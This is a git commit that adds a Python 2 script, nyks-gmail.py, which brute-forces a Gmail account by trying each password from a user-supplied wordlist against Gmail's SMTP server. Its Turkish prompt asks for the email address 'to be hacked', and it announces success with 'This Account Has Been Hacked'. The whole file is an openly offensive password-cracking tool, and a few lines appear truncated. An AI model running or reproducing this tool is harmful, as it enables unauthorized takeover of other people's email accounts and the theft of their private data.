d22c916dbd0a4fe2dca8f9bc8684c291ce523787
efebro <59443917+efebro@users.noreply.github.com>
2020-03-28 19:28:41 +0300

    Update and rename README.md to nyks-gmail.py

---
+++ nyks-gmail.py
@@ -0,0 +1,36 @@
+import smtplib
+from os import system
+                                                          >
+def main():
+   print '===================NYKS-WT======================'
+main()
+print '[1] Gmail'
+print '[2] exit'
+option = input('==>')
+if option == 1:
+   file_path = raw_input('Wordlist Yolu:')
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input('Hacklenecek E-Mail Adresi :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This Account Has Been Hacked Password >
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
